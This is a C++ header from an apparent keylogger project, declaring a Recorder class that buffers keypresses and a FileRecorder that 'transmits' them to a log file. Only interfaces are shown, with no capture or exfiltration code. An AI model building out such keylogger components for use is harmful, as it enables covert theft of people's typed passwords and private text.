#ifndef TRANSMITTER_H_
#define TRANSMITTER_H_

#include <filesystem>
#include <vector>

namespace keylogger {

using KeyList = std::vector<char>;

class Recorder {
 public:
  Recorder() = delete;
  explicit Recorder(int key_limit);
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  void BufferKeypress(char key);
  virtual void Transmit() = 0;

 protected:
  int num_keys_;
  KeyList keys_;
};

class FileRecorder : public Recorder {
 public:
  using FilePath = std::filesystem::path;

  FileRecorder() = delete;
  [[nodiscard]] FileRecorder(int key_limit, const FilePath& log_path);
  FileRecorder(const FileRecorder&) = default;
  FileRecorder& operator=(const FileRecorder&) = default;
  FileRecorder(FileRecorder&&) = default;
  FileRecorder& operator=(FileRecorder&&) = default;

  void Transmit() final;

 private:
  FilePath log_path_;
};

}  // namespace keylogger

#endif
